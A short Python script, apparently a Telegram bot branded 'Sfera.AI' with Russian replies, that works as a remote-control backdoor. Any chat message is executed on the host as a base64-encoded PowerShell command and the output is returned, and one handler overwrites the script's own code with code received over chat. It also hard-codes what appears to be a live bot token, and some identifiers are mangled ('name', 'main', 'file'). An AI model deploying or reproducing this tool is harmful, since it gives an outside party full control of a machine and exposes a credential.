import telebot
import subprocess
import base64
import os
import sys

TOKEN = '8559453371:AAGZVieHWP7htcNPivy0Lm5us_idQOaTADc'
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['status'])
def status(message):
    bot.reply_to(message, "🚀 Система Sfera.AI работает на 100%! Самообновление прошло успешно.")

@bot.message_handler(func=lambda m: m.text and m.text.startswith(''))
def self_update(message):
    try:
        new_code = message.text.replace('', '').strip()
        with open(file, 'w', encoding='utf-8') as f:
            f.write(new_code)
        bot.reply_to(message, "✅ Код принят. Перезагрузите агента вручную (Ctrl+C и запуск) в последний раз для активации режима UPDATE.")
    except Exception as e:
        bot.reply_to(message, f"❌ Ошибка: {e}")

@bot.message_handler(func=lambda m: True)
def handle_commands(message):
    try:
        encoded_cmd = base64.b64encode(message.text.encode('utf-16-le')).decode()
        process = subprocess.Popen(["powershell", "-NoProfile", "-EncodedCommand", encoded_cmd], 
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding='cp1251')
        stdout, stderr = process.communicate()
        bot.reply_to(message, f"💻 Исполнено:\n{stdout if stdout else stderr}")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Ошибка: {e}")

if name == 'main':
    bot.polling(none_stop=True)